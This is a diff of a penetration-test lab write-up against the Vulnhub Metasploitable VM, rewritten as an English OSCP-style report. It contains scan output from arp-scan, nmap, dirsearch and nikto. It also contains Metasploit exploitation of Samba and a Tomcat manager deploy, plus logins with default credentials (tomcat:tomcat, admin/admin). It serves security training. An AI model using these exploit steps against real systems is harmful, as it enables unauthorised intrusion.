@@ -1,27 +1,44 @@
-# Metasploitable 1.0
-### 说明
+---
+title: "Vulnhub-Metasploitable"
+author: ["lovehamethyst@gmail.com", "OSID: 123456"]
+date: "2023-09-07"
+subject: "Markdown"
+keywords: [Markdown, Example]
+subtitle: "OSCP Exam Report"
+lang: "en"
+titlepage: true
+titlepage-color: "1E90FF"
+titlepage-text-color: "FFFAFA"
+titlepage-rule-color: "FFFAFA"
+titlepage-rule-height: 2
+book: true
+classoption: oneside
+code-block-font-size: \scriptsize
 
-作者：h4m5t
+---
 
-时间:   2023/9/7
+# Vulnhub-Metasploitable-Report
 
-攻击机：kali2023.3   192.168.76.150
+author:h4m5t
 
-靶机：Metasploitable   192.168.76.151
+date:2023/9/7
 
-宿主机：win10  
+attacker:kali2023.3   192.168.76.150
 
-网络连接模式：NAT
+target machine:Metasploitable   192.168.76.151
+
+host machine:win10  
+
+Network:NAT
 
 
 
-### 信息收集
+# Information Gathering
 
-#### 查询IP
+## Search IP
 
 ```
-┌──(root㉿h4m5t)-[/home/kali/Desktop]
-└─# arp-scan -l
+# arp-scan -l
 Interface: eth0, type: EN10MB, MAC: 00:0c:29:d1:18:a8, IPv4: 192.168.76.150
 Starting arp-scan 1.10.0 with 256 hosts (https://github.com/royhills/arp-scan)
 192.168.76.1    00:50:56:c0:00:08       VMware, Inc.
@@ -33,11 +50,10 @@ Starting arp-scan 1.10.0 with 256 hosts (https://github.com/royhills/arp-scan)
 Ending arp-scan 1.10.0: 256 hosts scanned in 2.114 seconds (121.10 hosts/sec). 4 responded
 ```
 
-#### 扫描开放的端口
+## port scanning
 
 ```
-┌──(root㉿h4m5t)-[/home/kali/Desktop]
-└─# nmap -sV 192.168.76.151
+# nmap -sV 192.168.76.151
 Starting Nmap 7.94 ( https://nmap.org ) at 2023-09-07 05:11 EDT
 Nmap scan report for 192.168.76.151
 Host is up (0.00071s latency).
@@ -62,11 +78,10 @@ Service detection performed. Please report any incorrect results at https://nmap
 Nmap done: 1 IP address (1 host up) scanned in 11.76 seconds
 ```
 
-#### 爆破目录
+## directory fuzzing
 
 ```
-──(root㉿h4m5t)-[/home/kali/Desktop/dirsearch]
-└─# python dirsearch.py -u http://192.168.76.151
+# python dirsearch.py -u http://192.168.76.151
 Missing required dependencies to run.
 Do you want dirsearch to automatically install them? [Y/n] Y
 Installing required dependencies...
@@ -112,11 +127,10 @@ Target: http://192.168.76.151/
 Task Completed                                                                           
 ```
 
-#### 漏洞扫描
+## vulnerability scanning
 
 ```
-┌──(root㉿h4m5t)-[/home/kali/python]
-└─# nikto -h 192.168.76.151
+# nikto -h 192.168.76.151
 - Nikto v2.5.0
 ---------------------------------------------------------------------------
 + Target IP:          192.168.76.151
@@ -152,9 +166,9 @@ Task Completed
 
 
 
-### 方法一：SMB
+# Methodologies
 
-msf对SMB服务进行攻击。
+## Solution 1:SMB
 
 ```
 msf6 > search samba
@@ -209,15 +223,11 @@ root
 
 
 
+## Solution 2:tomcat
 
+open the default management page: http://192.168.76.151:8180/manager/html
 
-### 方法三：tomcat
-
-打开默认管理页面：http://192.168.76.151:8180/manager/html
-
-使用弱口令tomcat:tomcat登录。
-
-
+login with tomcat:tomcat
 
 ```
 msf6 > exploit/multi/http/tomcat_mgr_deploy
@@ -317,21 +327,13 @@ Server username: tomcat55
 
 
 
-
-
-### 其他方法
-
-打开扫描到的目录
+# Additional Items
 
 ```
 http://192.168.76.151/tikiwiki/tiki-index.php
 ```
 
-试用弱口令admin,admin登录。登录后需要修改密码。
-
-
-
-启动MSF 
+Try the weak password admin,admin log in. You need to change the password after the login.
 
 ```
 msf6 > search tikiwiki
